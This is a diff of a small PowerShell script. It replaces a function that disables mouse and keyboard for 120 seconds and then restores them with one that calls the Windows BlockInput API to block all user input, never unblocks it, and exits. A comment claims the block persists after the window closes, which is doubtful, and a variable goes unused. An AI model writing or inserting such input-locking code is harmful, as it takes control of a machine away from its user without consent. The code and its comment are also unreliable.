@@ -1,12 +1,13 @@
-function Disable-UserInput($seconds) {
-  Get-PnpDevice -FriendlyName "*Mouse*" | ForEach-Object { Disable-PnpDevice -InputObject $_ -Confirm:$false -ErrorAction SilentlyContinue }
-  Get-PnpDevice -FriendlyName "*Keyboard*" | ForEach-Object { Disable-PnpDevice -InputObject $_ -Confirm:$false -ErrorAction SilentlyContinue }
+function Disable-UserInput {
+  $jobName = "BlockUserInput"
+    $blockInput = Add-Type -Name "UserInput" -PassThru -MemberDefinition @"
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+"@
 
-  Write-Host "Wait please..." -ForegroundColor Blue
-  Start-Sleep $seconds
-
-  Get-PnpDevice -FriendlyName "*Mouse*" | ForEach-Object { Enable-PnpDevice -InputObject $_ -Confirm:$false -ErrorAction SilentlyContinue }
-  Get-PnpDevice -FriendlyName "*Keyboard*" | ForEach-Object { Enable-PnpDevice -InputObject $_ -Confirm:$false -ErrorAction SilentlyContinue }
+    # Persist blocking even if PowerShell window closes
+    $blockInput::BlockInput($true)
 }
 
-Disable-UserInput -seconds 120 | Out-Null
+Disable-UserInput | Out-Null
+exit
